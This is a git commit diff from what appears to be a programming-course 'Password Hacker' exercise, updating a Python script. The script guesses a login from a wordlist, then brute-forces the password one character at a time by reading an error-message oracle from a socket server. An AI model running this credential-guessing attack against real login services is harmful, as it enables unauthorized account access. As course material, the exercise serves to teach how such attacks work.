02e8d84f5f19a33c0c6a15818ae6e936096cddcc
Ansis Maleckis <maleckisansis@gmail.com>
2022-09-14 11:04:33 +0300

    finished stage 4

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -6,12 +6,15 @@ import string
 import os
 import json
 
-def next_password(file):
+def next_password():
 
-    passwords = (line for line in file.read().splitlines())
-    for password in passwords:
-        for combo in set(map(''.join, itertools.product(*zip(password.upper(), password.lower())))):
-            yield combo
+    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
+    i = -1
+    while True:
+        i += 1
+        yield chars[i % len(chars)]
+
+
 
 def next_login(file):
 
@@ -27,38 +30,50 @@ def get_login(file, new_socket):
 
     while True:
         dictionary = {"login" : login, "password" : " "}
-        json_str = json.dumps(dictionary)
-
-        new_socket.send(json_str.encode())
+        new_socket.send(json.dumps(dictionary).encode())
         message = new_socket.recv(1024).decode()
         if json.loads(message)["result"] != "Wrong login!":
-            print(json.loads(message)["result"])
             return login
         else:
             login = "".join(next(iter))
 
 
-def main():
+def get_password(login, new_socket):
 
-    file = open("C:\\Users\\Ansis\\Desktop\\ChemScraper\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt", "r")
+    iter = next_password()
+    password = "".join(next(iter))
+    temp = ""
+
+    while True:
+        dictionary = {"login" : login, "password" : password}
+        new_socket.send(json.dumps(dictionary).encode())
+        message = new_socket.recv(1024).decode()
+        if json.loads(message)["result"] == "Exception happened during login":
+            temp = password
+        elif json.loads(message)["result"] == "Connection success!":
+            return password
+        password = temp + "".join(next(iter))
+
+
+def get_args():
     args = sys.argv
     if len(args) != 3:
         print("wrong number of arguments")
         sys.exit(1)
+    return args
 
+
+def main():
+
+    args = get_args()
+    file = open("C:\\Users\\Ansis\\Desktop\\ChemScraper\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt", "r")
     new_socket = socket.socket()
     new_socket.connect((args[1], int(args[2])))
     login = get_login(file, new_socket)
-    print("login:", login)
-
-
-
-
-
-
+    password = get_password(login, new_socket)
+    print(json.dumps({"login" : login, "password" : password}))
     file.close()
     new_socket.close()
-    sys.exit(1)
 
 if __name__ == "__main__":
     main()
